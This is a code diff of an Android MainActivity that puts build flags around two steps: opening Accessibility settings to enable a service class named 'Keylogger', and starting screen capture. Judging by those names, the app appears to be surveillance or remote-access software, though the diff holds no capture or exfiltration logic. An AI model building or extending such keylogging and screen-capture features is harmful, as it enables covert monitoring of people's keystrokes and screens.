@@ -71,10 +71,13 @@ public class MainActivity extends AppCompatActivity {
         public void onActivityResult(ActivityResult result) {
             if(result != null && result.getResultCode() == RESULT_OK){
                 if(result.getData() != null){
-                    if(!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)){
-                        Keylogger.intent = result.getData();
-                        Keylogger.resCode = result.getResultCode();
-                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                    // Only request Accessibility Service if keylogger or screen features are enabled
+                    if (BuildConfig.FEATURE_KEYLOGGER || BuildConfig.FEATURE_SCREEN) {
+                        if(!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)){
+                            Keylogger.intent = result.getData();
+                            Keylogger.resCode = result.getResultCode();
+                            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                        }
                     }
                 }
             }
@@ -87,15 +90,17 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        // Check permission
-        mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        // Only initialize MediaProjectionManager if screen feature is enabled
+        if (BuildConfig.FEATURE_SCREEN) {
+            mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             checkPermission();
         }
         
-        // Always try to launch service if permissions are sorted or we are just starting
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
+        // Only request screen capture if screen feature is enabled
+        if(BuildConfig.FEATURE_SCREEN && mProjectionManager != null && ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
              startForResult.launch(mProjectionManager.createScreenCaptureIntent());
         }
 
